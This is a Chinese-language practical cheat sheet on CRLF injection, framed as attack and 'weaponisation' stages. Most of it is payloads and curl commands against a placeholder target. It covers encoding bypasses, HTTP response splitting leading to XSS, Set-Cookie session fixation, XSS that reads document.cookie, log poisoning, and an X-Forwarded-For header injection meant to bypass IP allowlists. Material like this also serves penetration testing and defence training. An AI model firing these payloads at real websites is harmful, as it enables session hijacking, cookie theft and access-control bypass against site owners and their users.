# CRLF 注入实战参考

> 阶段分离: [攻击] 检测CRLF注入点 → [利用] HTTP响应头注入/Set-Cookie注入/XSS/SSRF

---

# 攻击阶段 — 检测

## 1. 注入点识别

```bash
# 常见CRLF注入点:
# URL参数: ?redirect=%0d%0a
# Header值: User-Agent/Referer/Cookie → 可能被日志写回响应头
# 自定义Header: 如 X-API-Key → 可能被反射

# 构造:
%0d%0a → CRLF (\r\n)
%0a    → LF (\n)
%0d    → CR (\r)

# 编码绕过:
%250d%250a → 双重编码
%%0d%0a    → 百分号转义
%0d%0a     → URL编码
\r\n       → 原始CRLF (罕见, 但在某些场景有效)
```

### 1.1 延迟检测

```bash
# 注入点: ?redirect=/home
# 测试: ?redirect=/home%0d%0aSet-Cookie:test=1

curl -I "https://target.com/redirect?url=/home%0d%0aX-Test:%20injected"
# 如果响应头包含 X-Test: injected → CRLF注入确认
```

---

# 利用阶段 — 武器化

## 2. HTTP 响应头注入 (HTTP Response Splitting)

```http
# === 场景: Location 头重定向 ===
# 注入: /redirect?url=/home%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>

# 效果:
HTTP/1.1 302 Found
Location: /home
Content-Type:text/html

<script>alert(1)</script>
→ 浏览器将剩余部分解析为HTML → XSS!
```

## 3. Set-Cookie 注入 (会话固定)

```bash
# 注入:
/redirect?url=/home%0d%0aSet-Cookie:SESSION=hacker123

# 效果: 受害者点这个链接 → 被设置固定Session → 攻击者用同一Session登录
```

## 4. XSS via CRLF

```bash
# 构造:
/api/log?data=%0d%0a%0d%0a<script>alert(document.cookie)</script>

# 或:
/api/log?data=\n\n<script>alert(1)</script>     # JSON中

# 效果 (如果日志页面回显):
<html>
<body>
<div id="log">
<script>alert(document.cookie)</script>  ← 被执行
</div>
</body>
</html>
```

## 5. 日志投毒 / SSRF

```bash
# User-Agent 注入:
curl -H "User-Agent: Mozilla/5.0%0d%0aX-Injected:true" https://target.com/
# → 日志分析工具看到X-Injected头 → 某些系统日志→监控→告警

# 配合SSRF:
curl -H "X-Forwarded-For: 127.0.0.1%0d%0aX-Admin:true" https://target.com/api
# → IP白名单绕过
```

---

*参考: OWASP CRLF Injection + 实战案例*
